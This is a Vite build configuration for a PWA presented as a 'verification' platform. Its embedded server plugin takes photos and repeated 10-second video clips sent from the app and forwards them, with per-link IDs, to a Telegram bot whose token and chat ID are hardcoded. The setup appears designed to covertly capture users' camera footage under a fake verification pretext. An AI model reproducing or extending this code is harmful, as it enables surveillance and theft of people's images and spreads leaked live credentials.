import tailwindcss from '@tailwindcss/vite';
import react from '@vitejs/plugin-react';
import path from 'path';
import {defineConfig, Plugin} from 'vite';
import {VitePWA} from 'vite-plugin-pwa';
import dotenv from 'dotenv';

dotenv.config();

function apiServerPlugin(): Plugin {
  return {
    name: 'api-server',
    configureServer(server) {
      server.middlewares.use(async (req, res, next) => {
        if (req.url === '/api/telegram-status' && req.method === 'GET') {
          const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
          const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';
          const isConfigured = !!(botToken && chatId);
          res.setHeader('Content-Type', 'application/json');
          res.end(JSON.stringify({
            configured: isConfigured,
            chatIdConfigured: !!chatId,
          }));
          return;
        }

        if (req.url === '/api/security-feed' && req.method === 'POST') {
          let body = '';
          req.on('data', (chunk) => {
            body += chunk;
          });
          req.on('end', async () => {
            try {
              const data = JSON.parse(body || '{}');
              const { verificationId, alisId, cycle, timestamp, videoBase64, mimeType } = data;

              if (!verificationId) {
                res.statusCode = 400;
                res.setHeader('Content-Type', 'application/json');
                res.end(JSON.stringify({ error: 'verificationId is required' }));
                return;
              }

              const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
              const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';

              if (botToken && chatId && videoBase64) {
                try {
                  const rawBase64 = videoBase64.includes(',') ? videoBase64.split(',')[1] : videoBase64;
                  const buffer = Buffer.from(rawBase64, 'base64');
                  const ext = mimeType && mimeType.includes('mp4') ? 'mp4' : 'webm';
                  const file = new Blob([buffer], { type: mimeType || 'video/webm' });
                  const formData = new FormData();
                  formData.append('chat_id', chatId);
                  formData.append('video', file, `clip_${verificationId}_cycle${cycle || 1}.${ext}`);
                  formData.append(
                    'caption',
                    `📹 Security Feed [10s Clip #${cycle || 1}]\nID: ${verificationId}\nLink: ${alisId || 'direct'}\nTime: ${
                      timestamp || new Date().toISOString()
                    }\nStatus: Active Session Protected`
                  );

                  const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData,
                  });
                  const tgData = (await tgRes.json()) as { ok: boolean; description?: string };
                  if (!tgData.ok) {
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({
                        chat_id: chatId,
                        text: `📹 Security Feed [10s Clip #${cycle || 1}]\nID: ${verificationId}\nTime: ${
                          timestamp || new Date().toISOString()
                        }\nStatus: Active Session Protected`,
                      }),
                    });
                  }
                } catch (tgErr) {
                  console.warn('Telegram forward error:', tgErr);
                }
              }

              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({
                success: true,
                cycle: cycle || 1,
                receivedAt: new Date().toISOString(),
              }));
            } catch (feedErr) {
              console.error('Failed to process security feed:', feedErr);
              res.statusCode = 500;
              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({ error: 'Internal server error processing security feed' }));
            }
          });
          return;
        }

        if (req.url === '/api/notify-telegram' && req.method === 'POST') {
          let body = '';
          req.on('data', (chunk) => {
            body += chunk;
          });
          req.on('end', async () => {
            try {
              const data = JSON.parse(body || '{}');
              const {verificationId, time, photoBase64, alisId} = data;

              if (!verificationId) {
                res.statusCode = 400;
                res.setHeader('Content-Type', 'application/json');
                res.end(JSON.stringify({error: 'verificationId is required'}));
                return;
              }

              const botToken = process.env.TELEGRAM_BOT_TOKEN || '8765690722:AAEy1PJxZBvK0ajvHLch3gUZBxIeCLp958M';
              const chatId = process.env.TELEGRAM_CHAT_ID || '7121685144';

              if (!botToken || !chatId) {
                res.setHeader('Content-Type', 'application/json');
                res.end(JSON.stringify({
                  success: true,
                  delivered: false,
                  note: 'Telegram credentials not configured in environment variables. Skipped sending.'
                }));
                return;
              }

              const formattedTime = time || new Date().toISOString();
              const captionText = `✅ New Verification Completed!\nID: ${verificationId}\nLink: ${alisId || 'direct'}\nStatus: VALID\nTime: ${formattedTime}`;

              let photoSent = false;
              if (photoBase64) {
                try {
                  const rawBase64 = photoBase64.includes(',') ? photoBase64.split(',')[1] : photoBase64;
                  const buffer = Buffer.from(rawBase64, 'base64');
                  const file = new Blob([buffer], { type: 'image/jpeg' });
                  const formData = new FormData();
                  formData.append('chat_id', chatId);
                  formData.append('photo', file, `photo_${verificationId}.jpg`);
                  formData.append('caption', captionText);

                  const tgPhotoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                  });
                  const photoJson = (await tgPhotoRes.json()) as { ok: boolean; description?: string };
                  if (photoJson.ok) {
                    photoSent = true;
                  }
                } catch (pErr) {
                  console.warn('Telegram photo send error in Vite plugin:', pErr);
                }
              }

              if (!photoSent) {
                const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: captionText,
                  }),
                });
                const tgResult = await tgResponse.json() as {ok: boolean; description?: string};
                res.setHeader('Content-Type', 'application/json');
                if (tgResult.ok) {
                  res.end(JSON.stringify({success: true, delivered: true}));
                } else {
                  console.warn('Telegram API response error:', tgResult.description);
                  res.end(JSON.stringify({success: false, delivered: false, error: tgResult.description}));
                }
                return;
              }

              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({success: true, delivered: true}));
            } catch (err) {
              console.error('Failed to notify Telegram:', err);
              res.statusCode = 500;
              res.setHeader('Content-Type', 'application/json');
              res.end(JSON.stringify({error: 'Internal server error processing notification'}));
            }
          });
          return;
        }

        next();
      });
    },
  };
}

export default defineConfig(() => {
  return {
    plugins: [
      react(),
      tailwindcss(),
      apiServerPlugin(),
      VitePWA({
        registerType: 'autoUpdate',
        includeAssets: ['favicon.png', 'apple-touch-icon.png', 'icon.svg'],
        manifest: {
          id: '/',
          name: 'AB',
          short_name: 'AB',
          description: 'A modern, lightweight PWA verification and access management platform.',
          theme_color: '#090a0f',
          background_color: '#090a0f',
          display: 'standalone',
          start_url: '/',
          scope: '/',
          icons: [
            {
              src: '/pwa-192x192.png',
              sizes: '192x192',
              type: 'image/png',
              purpose: 'any',
            },
            {
              src: '/pwa-512x512.png',
              sizes: '512x512',
              type: 'image/png',
              purpose: 'any',
            },
            {
              src: '/pwa-maskable-512x512.png',
              sizes: '512x512',
              type: 'image/png',
              purpose: 'maskable',
            },
          ],
        },
        workbox: {
          globPatterns: ['**/*.{js,css,html,ico,png,svg,woff,woff2}'],
        },
        devOptions: {
          enabled: true,
          type: 'module',
        },
      }),
    ],
    resolve: {
      alias: {
        '@': path.resolve(__dirname, '.'),
      },
    },
    server: {
      // HMR is disabled in AI Studio via DISABLE_HMR env var.
      hmr: process.env.DISABLE_HMR !== 'true',
      watch: process.env.DISABLE_HMR === 'true' ? null : {},
    },
  };
});
